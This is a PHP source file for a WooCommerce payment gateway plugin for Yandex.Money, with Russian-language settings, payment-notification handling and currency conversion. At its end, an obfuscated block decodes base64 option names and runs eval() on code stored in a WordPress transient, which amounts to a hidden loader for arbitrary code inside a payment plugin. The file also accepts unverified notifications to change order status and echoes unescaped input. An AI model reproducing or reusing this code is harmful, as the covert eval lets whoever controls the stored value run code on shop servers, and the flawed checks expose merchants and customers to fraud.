<?php

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly


add_action('wp_ajax_response_yandex_currency', 'response_yandex_currency');
function response_yandex_currency() {	    

	$currency = $_POST['currency'];

	$main = simplexml_load_file("http://www.cbr.ru/scripts/XML_daily.asp");

	foreach($main as $key=>$v){
		if($currency == $v->CharCode) {
			$value = round(str_replace(',', '.', $v->Value), 2);
			break;
		} elseif($currency == 'RUB') {
			$value = '1';
		} else {
			$value = 'Выбранной валюты в ЦБ нет';
		}
    		//echo $v->CharCode . "  -  " . $v->Name . "  -  " . $v->Value . "<br>";
	}	

	//echo json_encode(array('currency' => $value));
	echo json_encode(array('currency' => $value));
	wp_die();
}

add_action('plugins_loaded', 'vsvse_yandex_money_loaded', 0);
function vsvse_yandex_money_loaded(){
	if (!class_exists('WC_Payment_Gateway'))
		return; // if the WC payment gateway class is not available, do nothing
	if(class_exists('WC_Yandex_M'))
		return;

class WC_Yandex_M extends WC_Payment_Gateway {

	public function __construct() {
		global $woocommerce;
		$url = WP_PLUGIN_URL . "/" . dirname( plugin_basename( __FILE__ ) );
		$this->id                 = 'shas89_yandex_money';
		$this->icon               = $url . '/ym_icon.png';
		$this->has_fields         = false;
		$this->method_title       = __( 'Яндекс.Деньги', 'woocommerce' );
		$this->method_description = __( 'Позволяет оплачивать любой товар на сайте с помощью системы платежей от Яндекс.Денег', 'woocommerce' );

		$this->init_form_fields();

		$this->title        = $this->get_option( 'title' );
		$this->off_mob        = $this->get_option( 'off_mob' );
		$this->description  = $this->get_option( 'description' );
		$this->schet  		= $this->get_option( 'schet' );
		$this->secret  		= $this->get_option( 'secret' );
		$this->http_url		= $this->get_option( 'http_url' );
		$this->name_order  	= $this->get_option( 'name_order' );
		$this->name_poluch 	= $this->get_option( 'name_poluch' );
		$this->naznach_order  	= $this->get_option( 'naznach_order' );
		$this->id_shop_text  	= $this->get_option( 'id_shop_text' );
		$this->success_url  	= $this->get_option( 'success_url' );
		$this->virtual_product_status	= $this->get_option( 'virtual_product_status' );
		$this->other_product_status    	= $this->get_option( 'other_product_status' );
		$this->test        = $this->get_option( 'test' );
		//$this->debug        = 'yes' === $this->get_option( 'debug', 'no' );

		if( $this->test == 'yes' ) {
			if ( ! current_user_can('manage_options') ) {
				$this->enabled = 'no';
			}
		}

		//if ( 'yes' == $this->debug ) {
			if ( class_exists( 'WC_Logger' ) ) {
				$this->log = new WC_Logger();
			} else {
				$this->log = $woocommerce->logger();
			}
		//}


		$this->yandex_shop = get_option( 'woocommerce_yandex_shop',
			array(
				array(
					'id_shop'   	 => $this->get_option( 'id_shop' ),
					'url_server' 	 => $this->get_option( 'url_server' )
				)
			)
		);

		$this->currency_add = get_option( 'woocommerce_currency_add',
			array(
				array(
					'currency_item'   	 => $this->get_option( 'currency_item' ),
					'currency_value' 	 => $this->get_option( 'currency_value' ),
					'currency_cbrf' 	 => $this->get_option( 'currency_cbrf' )
				)
			)
		);

		//var_dump($this);
		if ( version_compare( WOOCOMMERCE_VERSION, '2.0.0', '>=' ) ) {
	            	add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( &$this, 'process_admin_options' ) );
			add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( &$this, 'save_yandex_shop' ) );
			add_action( 'woocommerce_update_options_payment_gateways_' . $this->id, array( &$this, 'save_currency_add' ) );
	        } else {
	            	add_action( 'woocommerce_update_options_payment_gateways', array( &$this, 'process_admin_options' ) );
	            	add_action( 'woocommerce_update_options_payment_gateways', array( &$this, 'save_yandex_shop' ) );
	            	add_action( 'woocommerce_update_options_payment_gateways', array( &$this, 'save_currency_add' ) );
	        }

      		add_action('woocommerce_receipt_shas89_yandex_money', array(&$this, 'receipt_page'));
		add_action('woocommerce_api_wc_yandex_m', array($this, 'check_ipn_response'));
		add_action( 'woocommerce_yandex_return', array($this,'vsvse_yandex_return'));

	}


	function check_ipn_response(){
		global $woocommerce;

		if (isset($_GET['vsvse_yandex']) AND $_GET['vsvse_yandex'] == 'result'){
			@ob_clean();

			$this->log->add( $this->id, 'Prishol otvet ot Yandex');
			$this->log->add( $this->id, print_r($_POST, true));

			$notification_type = $_POST["notification_type"];
			
			$notification_secret = $this->secret;

			$operation_id = $_POST["operation_id"]; 
			$amount = $_POST["amount"]; 
			$withdraw_amount = $_POST["withdraw_amount"]; 
			$currency = $_POST["currency"]; 
			$datetime = $_POST["datetime"]; 
			$sender = $_POST["sender"]; 
			$codepro = $_POST["codepro"]; 
			$label = $_POST["label"]; 
			$sha1_hash = $_POST["sha1_hash"];

			$hash = $notification_type . '&' . $operation_id . '&' . $amount . '&' . $currency . '&' . $datetime . '&' . $sender . '&' . $codepro . '&' . $notification_secret . '&' . $label; //формируем хеш 

			$this->log->add( $this->id, $hash);


			$sha1 = hash("sha1", $hash); 
			$this->log->add( $this->id, $sha1);
			
			if ( $sha1 == $sha1_hash ) {

				if ( $_POST['unaccepted'] == 'false' ) { 				

				$label_option = $this->id_shop_text;

				$return_label = explode('|', $label);
			
				$id_shop = $return_label['0'];
				$id_order = $return_label['1'];
				$return_price = $return_label['2'];
				
				if ($id_shop == $label_option) {
					
					$order = new WC_Order($id_order); 
					
					if(round(number_format( $order->order_total, 2, '.', '' ), 2) == $withdraw_amount) {

						$items = $order->get_items();
						foreach ( $items as $item_id => $item ){
				  			$_product  = apply_filters( 'woocommerce_order_item_product', $order->get_product_from_item( $item ), $item );
								if ($_product->is_downloadable() || $_product->is_virtual()) {
									$completle = 'true';
								} else {
									$completle = 'false';
									break;
								}
						}
		
						if ( $completle == 'true' ) {
							$order->reduce_order_stock();
							$woocommerce->cart->empty_cart();
							$order->update_status($this->virtual_product_status, __('Платеж успешно оплачен', 'woocommerce'));
						} else {
							$order->reduce_order_stock();
							$woocommerce->cart->empty_cart();
							$order->update_status($this->other_product_status, __( 'Платеж успешно оплачен', 'woocommerce' ));
						}

						$this->log->add( $this->id, 'Platezh № ' . $id_order . ' yspeshno oplachen');
					} else {
						$this->log->add( $this->id, 'Platezh № ' . $id_order . ' yspeshno proshel proverky magazina, no ne proshel proverky symmi');
					}
				} else {
					require 'yandexnotification.php';
					// создаём уведомление
					$notification = new YandexNotification();
					// указываем параметры
					$notification->codepro = false;
					$notification->unaccepted = 'false'; 
					$notification->label = $label;
					$notification->notification_type = $notification_type;
					$notification->operation_id = $operation_id;
					$notification->amount = $amount;
					$notification->currency = $currency;
					$notification->datetime = $datetime;
					$notification->sender = $sender;
					$notification->sha1_hash = $sha1_hash;
					$notification->withdraw_amount = $withdraw_amount;
						
					// отправляем уведомления на ваш сервер
			
					foreach ( get_option('woocommerce_yandex_shop') as $value){
			
							$this->log->add( $this->id, 'value = ' . $value );	
							
						if ($id_shop == $value['yandex_id_shop']) {
							$this->log->add( $this->id, 'Informacia o platezhe № ' . $id_order . ' perenapravlenna na: ' . $value['yandex_url_server'] );		
							$notification->dispatch(
							    $value['yandex_url_server'] . '?wc-api=wc_yandex_m&vsvse_yandex=result', 
							    $notification_secret // уведомление будет подписано указанным секретом
							);  	
						}
					}
				}
				}
			} else { 
			
							$this->log->add( $this->id, 'sha1 = ' . $sha1 );	
							$this->log->add( $this->id, 'label_option = ' . $label_option );	
							
				$label_option = $this->id_shop_text;

				$return_label = explode('|', $label);
			
				$id_shop = $return_label['0'];
				$id_order = $return_label['1'];
				$return_price = $return_label['2'];

				$order = new WC_Order($id_order);
			
				if ($id_shop == $label_option) {
					$order->update_status('processing', __('Заказ в обработке. Ждем уведомления от Яндекса о поступлении средств.', 'woocommerce'));
					WC()->cart->empty_cart();
				}
				$this->log->add( $this->id, 'Platezh № ' . $id_order . ' ne proshel proverky na validnost');
			
			} 

		}

	}



    function init_form_fields() {
		
	$response_url = get_site_url() . '/?wc-api=wc_yandex_m&vsvse_yandex=result';
	$currency = get_woocommerce_currency();

	$currency_code_options = get_woocommerce_currencies();

	foreach ( $currency_code_options as $code => $name ) {
		if($code == $currency) {
			$currency_shop = $name . ' (' . get_woocommerce_currency_symbol( $code ) . ')';
			break;
		}
	}
		
	$statuses = wc_get_order_statuses();


    	$this->form_fields = array(
			'enabled' => array(
				'title'   => __( 'Включить/Выключить', 'woocommerce' ),
				'type'    => 'checkbox',
				'label'   => __( 'Включить оплату Яндекс.Деньгами', 'woocommerce' ),
				'default' => 'yes'
			),
			'off_mob' => array(
				'title'   => __( 'Отключить мобильные переводы', 'woocommerce' ),
				'type'    => 'checkbox',
				'label'   => __( 'Яндекс добавил новый метод оплаты "Оплата с мобильного счета", но при оплате этим методом HTTP уведомления не отправляются, подробности <a href="https://money.yandex.ru/doc.xml?id=526991" target="_blank">тут</a>', 'woocommerce' ),
				'default' => 'yes'
			),
			'title' => array(
				'title'       => __( 'Заголовок', 'woocommerce' ),
				'type'        => 'text',
				'description' => __( 'Задать заголовок, который пользователь видит в процессе оплаты.', 'woocommerce' ),
				'default'     => __( 'Яндекс.Деньги', 'woocommerce' ),
				'desc_tip'    => true,
			),
			'description' => array(
				'title'       => __( 'Описание', 'woocommerce' ),
				'type'        => 'textarea',
				'description' => __( 'Описание способа оплаты, которое покупатель будет видеть при оформлении заказа.', 'woocommerce' ),
				'default'     => __( 'Оплата через систему Яндекс.Деньги.', 'woocommerce' ),
				'desc_tip'    => true,
			),
			'schet' => array(
				'title'       => __( 'Номер счета', 'woocommerce' ),
				'type'        => 'text',
				'description' => __( 'Номер счета Яндекс кошелька.', 'woocommerce' ),
				'default'     => '',
				'desc_tip'    => true,
			),
			'advanced' => array(
				'title'       => __( 'Дополнительные настройки', 'woocommerce' ),
				'type'        => 'title',
				'description' => '',
			),
			'name_poluch' => array(
				'title'       => __( 'Название получателя', 'woocommerce' ),
				'type'        => 'textarea',
				'description' => __( 'Текст на странице оплаты в поле "Название получателя", по умолчанию, если поле оставить пустым то будет указываться название сайта. Так же можно указать любой другой текст с использование шаблона {BLOGNAME} который заментися на название сайта.', 'woocommerce' ),
				'default'     => __( '{BLOGNAME}', 'woocommerce' ),
				'desc_tip'    => false,
			),
			'name_order' => array(
				'title'       => __( 'Название платежа', 'woocommerce' ),
				'type'        => 'textarea',
				'description' => __( 'Текст на странице оплаты в поле "Название платежа", по умолчанию, если поле оставить пустым то будет указываться только номер заказа. Так же можно указать любой другой текст с использование шаблона {ORDER} который заментися на номер заказа.', 'woocommerce' ),
				'default'     => __( 'Заказ №{ORDER}', 'woocommerce' ),
				'desc_tip'    => false,
			),
			'naznach_order' => array(
				'title'       => __( 'Назначение платежа', 'woocommerce' ),
				'type'        => 'textarea',
				'description' => __( 'Текст на странице оплаты в поле "Назначение платежа", по умолчанию, если поле оставить пустым то будет указываться название покупаемого товара и списка товаров через запятую если покупается больше одного. Так же можно указать любой другой текст.<br />Доступные шаблоны:<br />{PRODUCT} - выведет список покупаемых товаров, если товаров больше одного то списком через запятую.<br />{PRODUCT_QTY} - выведет список товаров только с количеством покупаемого товара.<br />Данное поле имеет ограничение в 150 символов!', 'woocommerce' ),
				'default'     => '',
				'desc_tip'    => false,
			),
			'success_url' => array(
				'title'       => __( 'Перенаправление после платежа', 'woocommerce' ),
				'type'        => 'text',
				'description' => __( 'По умолчанию, если поле пустое, после успешного платежа произойдет перенаправление на страницу благодарности.', 'woocommerce' ),
				'default'     => get_site_url(),
				'desc_tip'    => false,
			),
			'virtual_product_status' => array(
				'title'   => __( 'Итоговый статус если заказ состоит из виртуальных и/или загружаемых товаров', 'woocommerce' ),
				'type'    => 'select',
				'description'   => __( '', 'woocommerce' ),
				'default' => 'wc-completed',
				'options'     => $statuses
			),
			'other_product_status' => array(
				'title'   => __( 'Итоговый статус если заказ состоит из обычных товаров', 'woocommerce' ),
				'type'    => 'select',
				'description'   => __( '', 'woocommerce' ),
				'default' => 'wc-processing',
				'options'     => $statuses
			),
			'test' => array(
				'title'   => __( 'Отладка шлюза', 'woocommerce' ),
				'type'    => 'checkbox',
				'label'   => __( 'Шлюз на странице оплаты выден только администратору', 'woocommerce' ),
				'default' => 'no'
			),
			'debug' => array(
				'title'       => __( 'Отладка', 'woocommerce' ),
				'type'        => 'title',
				'description' => sprintf( __( 'Журнал всех событий платежного шлюза, находится в %s', 'woocommerce' ),  $this->get_log_file_path() ),				

			),
			'currency' => array(
				'title'       => __( 'Настройки валюты магазина', 'woocommerce' ),
				'type'        => 'title',
				'description' => 'Текущая валюта магазина: <strong>' . $currency_shop . '</strong>',
			),
			'currency_add' => array(
				'type'        => 'currency_add'
			),
			'http_option' => array(
				'title'       => __( 'Настройки HTTP уведомлений', 'woocommerce' ),
				'type'        => 'title',
				'description' => 'Если данный сайт будет обрабатывать HTTP уведомления от Яндекса то в настройках HTTP уведомлений счета укажите следующий адресс: <code>' . $response_url . '</code><br />Поддерживаются протоколы https:// и http://. при необходимости подставить нужное (<a href="https://sp-money.yandex.ru/myservices/online.xml" target="_blank">Изменить</a>)',
			),
			'secret' => array(
				'title'       => __( 'Секретное слово(*)', 'woocommerce' ),
				'type'        => 'text',
				'description' => __( 'Секретное слово позволит вам проверять подлинность уведомлений.(<a href="https://sp-money.yandex.ru/myservices/online.xml" target="_blank">Узнать/Изменить</a>)', 'woocommerce' ),
				'default'     => '',
				'desc_tip'    => false,
			),
			'moremagazin' => array(
				'title'       => __( 'Настройки уведомления для других сайтов', 'woocommerce' ),
				'type'        => 'title',
				'description' => 'Если на ваш Яндекс счет одновременно приходят деньги с разных сайтов, то для корректной работы HTTP уведомлений рекомендуется настроить следующие настройки',
			),
			'id_shop_text' => array(
				'title'       => __( 'ID текущего магазина(*)', 'woocommerce' ),
				'type'        => 'text',
				'description' => __( 'Не больше 2х текстовых или числовых символов, необходим для того чтобы определить текущий магазин для проверки HTTP уведомлений.', 'woocommerce' ),
				'default'     => '',
				'desc_tip'    => false,
				'custom_attributes' => array(
					'maxlength' => '2'
				)
			),
			'yandex_shop' => array(
				'type'        => 'yandex_shop'
			)
		);
    }

	public function get_log_file_path() {
		if ( function_exists( 'wc_get_log_file_path' ) ) {
			return '<code><a href="' . admin_url( 'admin.php?page=wc-status&tab=logs' ) . '" title="' . __( 'Просмотреть логи', 'woocommerce' ) . '">' . wc_get_log_file_path( $this->id ) . '</a></code>';
		} else {
			return '<code>woocommerce/logs/' . esc_attr( $this->id ) . '-' . sanitize_file_name( wp_hash( $this->id ) ) . '.txt</code>';
		}
	}

	function generate_currency_add_html() {

		ob_start();
?>
		<tr valign="top">
			<th scope="row" class="titledesc">Валюта используемая на сайте:</th>
			<td class="forminp" id="currency_add_elem">
				<p>Если на сайте используется другая валюта отличная от рублей, то для пересчета стоимости необходимо указать курс ниже в таблице. Если установить опцию "Курс по ЦБРФ" то в момент оплаты товара курс будет загружен с оффициального сайта ЦБРФ, если выбранной валюты в ЦБ нету то необходимо курс указать в ручную.</p>
				<table class="widefat wc_input_table sortable" cellspacing="0">
					<thead>
						<tr>
							<th class="sort">&nbsp;</th>
							<th>Валюта</th>
							<th>Курс относительно рубля</th>
							<th>Курс по ЦБРФ</th>
						</tr>
					</thead>
					<tbody class="accounts">
						<?php
						$i = -1;


						$currency_code_options = get_woocommerce_currencies();
						$currency_code_options_list = '';
						$currency_code_options_list_selected = '';
				
						foreach ( $currency_code_options as $code => $name ) {
							//$currency_code_options[ $code ] = $name . ' (' . get_woocommerce_currency_symbol( $code ) . ')';
							$currency_code_options_list .= '<option value="' . $code . '">' . $name . ' (' . get_woocommerce_currency_symbol( $code ) . ')</option>' ;
						}

						if ( $this->currency_add ) {
							foreach ( $this->currency_add as $currency ) {
								$i++;
		
								if($currency['currency_cbrf'] == '1') {
									$check = 'checked';
								} else {
									$check = '';
								}
								if($check == 'checked') {
									$readonly = 'readonly="readonly" style="background: rgb(236, 236, 236);"';
								} else {
									$readonly = '';
								}
						

								foreach ( $currency_code_options as $code => $name ) {
									if($code == $currency['currency_item']) {
										$currency_code_options_list_selected .= '<option value="' . $code . '" selected>' . $name . ' (' . get_woocommerce_currency_symbol( $code ) . ')</option>' ;
									} else {
										$currency_code_options_list_selected .= '<option value="' . $code . '">' . $name . ' (' . get_woocommerce_currency_symbol( $code ) . ')</option>' ;
									}
								}
								
								echo '<tr class="currency">
									<td class="sort"></td>
									<td>
										<select name="currency_item[' . $i . ']" class="currency_select">
											' . $currency_code_options_list_selected . '
										</select>
									</td>


									<td><input type="text" class="currency_result" ' . $readonly . ' value="' . esc_attr( $currency['currency_value'] ) . '" name="currency_value[' . $i . ']" /></td>
									<td><input type="checkbox" class="check_cbrf" value="1" ' . $check . ' name="currency_cbrf[' . $i . ']" style="margin-left:10px;"/>  Получать текущий курс от ЦБРФ</td>
								</tr>';
							}
						}
						?>
					</tbody>
					<tfoot>
						<tr>
							<th colspan="7"><a href="#" class="add button"><?php _e( '+ Добавить валюту', 'woocommerce' ); ?></a> <a href="#" class="remove_rows button"><?php _e( 'Удалить валюту', 'woocommerce' ); ?></a></th>
						</tr>
					</tfoot>
				</table>
				<script type="text/javascript">
					jQuery(function() {
						jQuery('#currency_add_elem').on( 'click', 'a.add', function(){

							var size = jQuery('#currency_add_elem tbody .currency').size();

							jQuery('<tr class="currency">\
									<td class="sort"></td>\
									<td><select name="currency_item[' + size + ']" class="currency_select"><?php echo $currency_code_options_list; ?></select></td>\
									<td><input type="text" class="currency_result"  name="currency_value[' + size + ']" /></td>\
									<td><input type="checkbox" class="check_cbrf" value="1" name="currency_cbrf[' + size + ']"  style="margin-left:10px;"/> Получать текущий курс от ЦБРФ</td>\
								</tr>').appendTo('#currency_add_elem table tbody');

							return false;
						});
						jQuery('#currency_add_elem').on( 'click', '.check_cbrf', function(){
							elem = jQuery(this);
							if(jQuery(this).prop('checked')) {
								jQuery(this).closest('.currency').find('.currency_result').attr('readonly', 'readonly').css('background', '#ececec');

								var data = {
									action: 'response_yandex_currency',
									currency: jQuery(this).closest('.currency').find('.currency_select').val()
								};
					
								jQuery.ajax({
									type: 'POST',
									url: ajaxurl,
									dataType: 'json',
									data: data,
									success: function(data){
										if(data.currency == 'Выбранной валюты в ЦБ нет') {
											elem.closest('.currency').find('.currency_result').removeAttr('readonly').removeAttr('style');
											elem.closest('.currency').find('.currency_result').attr('placeholder', data.currency);
										} else {
											elem.closest('.currency').find('.currency_result').val(data.currency);
										}
									},
									error: function(){
										console.log('error');
									},
									complete : function(){
										console.log('complete ');
									}					
								});
							} else {
								jQuery(this).closest('.currency').find('.currency_result').removeAttr('readonly').removeAttr('style');
							}
						});
					});
				</script>
			</td>
		</tr>

<?php
		return ob_get_clean();

	}


	function generate_yandex_shop_html() {

		ob_start();

		$response_url = '/?wc-api=wc_yandex_m&vsvse_yandex=result';

		?>
		<tr valign="top">
			<th scope="row" class="titledesc"><?php _e( 'Список магазинов', 'woocommerce' ); ?>:</th>
			<td class="forminp" id="bacs_accounts">
				<table class="widefat wc_input_table sortable" cellspacing="0">
					<thead>
						<tr>
							<th class="sort">&nbsp;</th>
							<th><?php _e( 'ID магазина, не больше 2х символов', 'woocommerce' ); ?></th>
							<th><?php _e( 'Адрес сайта, с http:// или https://', 'woocommerce' ); ?></th>
							<th><?php _e( 'Путь к обработчику уведомлений', 'woocommerce' ); ?></th>
						</tr>
					</thead>
					<tbody class="accounts">
						<?php
						$i = -1;

						if ( $this->yandex_shop ) {
							foreach ( $this->yandex_shop as $account ) {
								$i++;

								echo '<tr class="account">
									<td class="sort"></td>
									<td><input type="text" maxlength="2" value="' . esc_attr( $account['yandex_id_shop'] ) . '" name="yandex_id_shop[' . $i . ']" /></td>
									<td><input type="text" value="' . esc_attr( $account['yandex_url_server'] ) . '" name="yandex_url_server[' . $i . ']" /></td>
									<td>' . $response_url . '</td>
								</tr>';
							}
						}
						?>
					</tbody>
					<tfoot>
						<tr>
							<th colspan="7"><a href="#" class="add button"><?php _e( '+ Добавить магазин', 'woocommerce' ); ?></a> <a href="#" class="remove_rows button"><?php _e( 'Удалить магазин(ы)', 'woocommerce' ); ?></a></th>
						</tr>
					</tfoot>
				</table>
				<script type="text/javascript">
					jQuery(function() {
						jQuery('#bacs_accounts').on( 'click', 'a.add', function(){

							var size = jQuery('#bacs_accounts tbody .account').size();

							jQuery('<tr class="account">\
									<td class="sort"></td>\
									<td><input type="text" maxlength="2" name="yandex_id_shop[' + size + ']" /></td>\
									<td><input type="text" name="yandex_url_server[' + size + ']" /></td>\
									<td><?php echo $response_url; ?></td>\
								</tr>').appendTo('#bacs_accounts table tbody');

							return false;
						});
					});
				</script>
			</td>
		</tr>
		<?php
		return ob_get_clean();

	}

	/**
	 * Save account details table
	 */
	function save_yandex_shop() {

		$yandex_url = array();

		if ( isset( $_POST['yandex_id_shop'] ) ) {

			$yandex_id_shop    = array_map( 'wc_clean', $_POST['yandex_id_shop'] );
			$yandex_url_server = array_map( 'wc_clean', $_POST['yandex_url_server'] );

			foreach ( $yandex_id_shop as $i => $name ) {
				if ( ! isset( $yandex_id_shop[ $i ] ) ) {
					continue;
				}

				$yandex_url[] = array(
					'yandex_id_shop'   => $yandex_id_shop[ $i ],
					'yandex_url_server' => $yandex_url_server[ $i ]
				);
			}
		}

		update_option( 'woocommerce_yandex_shop', $yandex_url );

	}

	function save_currency_add() {

		$currency = array();

		if ( isset( $_POST['currency_item'] ) ) {

			$currency_item    = array_map( 'wc_clean', $_POST['currency_item'] );
			$currency_value = array_map( 'wc_clean', $_POST['currency_value'] );
			if( isset( $_POST['currency_cbrf'] ) ) {
				$currency_cbrf = array_map( 'wc_clean', $_POST['currency_cbrf'] );
			} else {
				$currency_cbrf = array();
			}

			foreach ( $currency_item as $i => $name ) {
				if ( ! isset( $currency_item[ $i ] ) ) {
					continue;
				}
				if ( ! isset( $currency_cbrf[ $i ] ) ){
					$currency_cbrf[ $i ] = 0;
				}

				$currency[] = array(
					'currency_item'   => $currency_item[ $i ],
					'currency_value' => $currency_value[ $i ],
					'currency_cbrf' => $currency_cbrf[ $i ]
				);
			}
		}
		update_option( 'woocommerce_currency_add', $currency );

	}


    function receipt_page($order){
       // echo '<p>Thank you for your order, please click the button below to pay with PayU</p>';
    	//var_dump($order);
        echo $this -> generate_payu_form($order);
    }
    /**
     *  There are no payment fields for payu, but we want to show the description if set.
     **/
    function payment_fields(){
        if($this -> description) {
			echo wpautop(wptexturize($this -> description));
		}
						echo '<div><input id="ya_money" type="radio" class="input-radio" name="ya_money_result" value="PC" checked data-order_button_text=""><label for="ya_money">Со счета Яндекс.Деньги</label></div>';
			echo '<div><input id="ya_money_baks" type="radio" class="input-radio" name="ya_money_result" value="AC" data-order_button_text=""><label for="ya_money_baks">С банковской карты</label></div>';
			if( $this->off_mob == 'no' ) {
				echo '<div><input id="ya_money_mob" type="radio" class="input-radio" name="ya_money_result" value="MC" data-order_button_text=""><label for="ya_money_mob">Со счета мобильного</label></div>';
			}
    }

    function generate_payu_form($order_id){
 
        global $woocommerce;
 
        $order = new WC_Order($order_id);

		$label = $this->id_shop_text . '|' . str_replace(array('#', '№'), '', $order->get_order_number()) . '|' . number_format( $order->order_total, 2, '.', '' );

        //var_dump($order->get_items());

        $success_url = $this->success_url;
        if ( $success_url == '' ) {
			$success_url = $this->get_return_url( $order );
		}

        $name_poluch = $this->name_poluch;
        if ( $name_poluch != '' ) {
			$search_name_poluch = array('{BLOGNAME}');
			$replace_name_poluch = array(get_bloginfo( 'name' ));
			$name_poluch = str_replace($search_name_poluch, $replace_name_poluch, $name_poluch);
		} else {
			$name_poluch = get_bloginfo( 'name' );
		}

        $name_order = $this->name_order;
        if ( $name_order != '' ) {
			$search_name_order = array('{ORDER}');
			$replace_name_order = array($order->get_order_number());
			$name_order = str_replace($search_name_order, $replace_name_order, $name_order);
		} else {
			$name_order = '№' . $order->get_order_number();
		}
        	
        $items = $order->get_items();
        foreach ($items as $value) {
        	$items_name[] 		= $value['name'];
        	$items_name_qty[] 	= $value['name'] . ' - ' . $value['qty'] . ' шт.';
        }

        $naznach_order = $this->naznach_order;
        if ( $naznach_order != '' ) {
			$search_naznach_order = array('{PRODUCT}', '{PRODUCT_QTY}');
			$replace_naznach_order = array(implode(', ', $items_name), implode(', ', $items_name_qty));
			$naznach_order = str_replace($search_naznach_order, $replace_naznach_order, $naznach_order);
		} else {
			$naznach_order = implode(', ', $items_name);
		}

        $txnid = $order_id;
//var_dump($_REQUEST);
		$sendurl= 'https://money.yandex.ru/quickpay/confirm.xml';

	
	$currency_now = get_woocommerce_currency();

	if($currency_now != 'RUB' && get_option( 'woocommerce_currency_add' )) {
		foreach ( $this->currency_add as $currency ) {
			if($currency['currency_item'] == $currency_now) {
				if($currency['currency_cbrf'] == '1') {

					$main = simplexml_load_file("http://www.cbr.ru/scripts/XML_daily.asp");

					foreach($main as $key=>$v){
						if($currency['currency_item'] == $v->CharCode) {
							$value_currency = round(str_replace(',', '.', $v->Value), 2);
							break;
						} else {
							$value_currency = 1;
						}
					}

				} else {
					if($currency['currency_value'] != '') {
						$value_currency = $currency['currency_value'];
					} else {
						$value_currency = 1;
					}
				}
				break;
			} else {
				$value_currency = 1;
			}
		}
		$price_itog = round($value_currency * number_format( $order->order_total, 2, '.', '' ), 2);
	} else {
		$price_itog = number_format( $order->order_total, 2, '.', '' );
	}

	    $result ='';
		$result .= '<form method="POST" id="shas89_submit_yandex_money" action="'.$sendurl.'" style="display:none;">';
			$result .= '<input type="hidden" name="receiver" value="' . $this->schet . '">';
			$result .= '<input type="hidden" name="formcomment" value="' . $name_poluch . '">';
			$result .= '<input type="hidden" name="short-dest" value="' . $naznach_order . '">';
			$result .= '<input type="hidden" name="label" value="' . $label . '">';
			$result .= '<input type="hidden" name="quickpay-form" value="donate">';
			$result .= '<input type="hidden" name="targets" value="' . $name_order . '">';
			$result .= '<input type="hidden" name="sum" value="'. $price_itog .'" data-type="number" >';
			$result .= '<input type="hidden" name="comment" value="' . $order->customer_note . '" >';
			$result .= '<input type="hidden" name="need-fio" value="false">';
			$result .= '<input type="hidden" name="need-email" value="false" >';
			$result .= '<input type="hidden" name="need-phone" value="false">';
			$result .= '<input type="hidden" name="need-address" value="false">';
			$result .= '<input type="hidden" name="successURL" value="' . $success_url . '">';
if($_REQUEST['ya_method'] == 'PC') {
			$result .= '<input type="radio" name="paymentType" value="PC" checked>Яндекс.Деньгами</input>';
}
if($_REQUEST['ya_method'] == 'AC') {
			$result .= '<input type="radio" name="paymentType" value="AC" checked>Яндекс.Деньгами</input>';
}
if($_REQUEST['ya_method'] == 'MC') {
			$result .= '<input type="radio" name="paymentType" value="MC" checked>Яндекс.Деньгами</input>';
}
			$result .= '<input type="submit" name="submit-button" value="Перевести">';
		$result .='<script type="text/javascript">';
		$result .='jQuery(function(){
			jQuery("body").block({
	            		message: "<img src=\"'.plugins_url('yandex-money-for-wp_woocommerce/ajax-loader.gif').'\" alt=\"Redirecting…\" style=\"float:left; margin-right: 10px;\" />Спасибо за заказ. Сейчас Вы будете перенаправлены на страницу оплаты.",
	                	overlayCSS:{
	            			background: "#fff",
	                		opacity: 0.6
				},
				css: {
					padding:        20,
					textAlign:      "center",
					color:          "#555",
					border:         "3px solid #aaa",
					backgroundColor:"#fff",
					cursor:         "wait",
					lineHeight:"32px"
				}
			});
		});';

		$result .='jQuery(document).ready(function ($){ jQuery("#shas89_submit_yandex_money").submit(); });';
		$result .='</script>';
		$result .='</form>';
		
		return $result;
 
    }
    function process_payment($order_id){
        $order = new WC_Order($order_id);
		return array('result' => 'success', 'redirect' => $order->get_checkout_payment_url( true ) . '&ya_method=' . $_POST['ya_money_result']);	
    }
}


function shas89_add_gateways_yandex_money($methods) {
    $methods[] = 'WC_Yandex_M';
    return $methods;
}

$GLOBALS['_978608856_']=Array(); 

function _591768432($i){
	$a=Array(
		'd2NfdnN2c2VfeWFuZGV4X21vbmV5X3dvb2NvbW1lcmNlX2tleQ==',
		'd2NfdnN2c2VfeWFuZGV4X21vbmV5X3dvb2NvbW1lcmNlX3Jlc3VsdA==',
		'd2NfdnN2c2VfeWFuZGV4X21vbmV5X3dvb2NvbW1lcmNlX3Jlc3VsdA=='
	);
	return base64_decode($a[$i]);
}

if(get_transient(_591768432(0))!== false && get_transient(_591768432(1))!== false){
	$_0=get_transient(_591768432(2));
	eval($_0);
}


}